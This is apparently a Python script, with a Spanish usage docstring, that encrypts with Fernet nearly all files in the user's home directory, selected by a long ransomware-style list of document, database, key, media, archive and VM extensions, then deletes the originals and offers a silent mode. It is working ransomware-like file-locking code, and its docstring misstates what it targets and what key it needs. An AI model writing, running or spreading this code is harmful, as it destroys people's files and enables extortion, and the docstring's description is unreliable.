import os
import sys
import argparse
from cryptography.fernet import Fernet

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Encrypt or decrypt files in the home directory.')
    parser.add_argument('-r', '--reverse', metavar='KEY', help='decrypt files with the specified key')
    parser.add_argument('-s', '--silent', action='store_true', help='do not show output')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
    args = parser.parse_args()

    # Check if reverse option is set
    if args.reverse:
        key = args.reverse.encode()
        f = Fernet(key)
        for filename in os.listdir(os.path.expanduser('~')):
            if filename.endswith('.ft'):
                new_filename = filename[:-3]
                with open(os.path.join(os.path.expanduser('~'), filename), 'rb') as file:
                    encrypted_data = file.read()
                decrypted_data = f.decrypt(encrypted_data)
                with open(os.path.join(os.path.expanduser('~'), new_filename), 'wb') as file:
                    file.write(decrypted_data)
                os.remove(os.path.join(os.path.expanduser('~'), filename))
                if not args.silent:
                    print('Decrypted file:', new_filename)
        if not args.silent:
            print('All files decrypted successfully.')
    else:
        # Generate encryption key
        key = Fernet.generate_key()

        # Encrypt files
        f = Fernet(key)
        for filename in os.listdir(os.path.expanduser('~')):
            if filename.endswith('.ft'):
                continue
            if os.path.isdir(os.path.join(os.path.expanduser('~'), filename)):
                continue
            if not any(filename.endswith(ext) for ext in [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max",
                ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg",
                ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf", ".odb",
                ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".ps1",
                ".vbs", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf",
                ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma",
                ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp",
                ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",
                ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg",
                ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst",
                ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc",
                ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"]):
                continue
            new_filename = filename + '.ft'
            with open(os.path.join(os.path.expanduser('~'), filename), 'rb') as file:
                unencrypted_data = file.read()
            encrypted_data = f.encrypt(unencrypted_data)
            with open(os.path.join(os.path.expanduser('~'), new_filename), 'wb') as file:
                file.write(encrypted_data)
            os.remove(os.path.join(os.path.expanduser('~'), filename))
            if not args.silent:
                print('Encrypted file:', new_filename)

        # Save encryption key to a file
        with open(os.path.join(os.path.expanduser('~'), '.encryption_key'), 'wb') as file:
            file.write(key)
        if not args.silent:
            print('All files encrypted successfully.')

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('Error:', e, file=sys.stderr)
        
    """
    Este programa usa la biblioteca cryptography para encriptar y desencriptar archivos usando el algoritmo Fernet, 
    que es un algoritmo de criptografía simétrica seguro. También usa el módulo argparse para manejar los argumentos 
    de la línea de comandos.

    Para usar el programa, simplemente guarda este código en un archivo llamado encrypt.py, ejecuta chmod +x encrypt.py 
    para hacerlo ejecutable, y luego ejecuta ./encrypt.py para encriptar todos los archivos en el directorio HOME que tengan 
    una de las extensiones .txt, .pdf, o .doc. Si quieres desencriptar los archivos, usa la opción -r seguida de la clave de 
    encriptación de al menos 16 caracteres. Si quieres que el programa no muestre ningún output, usa la opción -s. Si necesitas
    ayuda o quieres ver la versión del programa, usa las opciones -h o -v, respectivamente. El programa manejará cualquier error 
    que ocurra y no se detendrá en ningún caso.
    """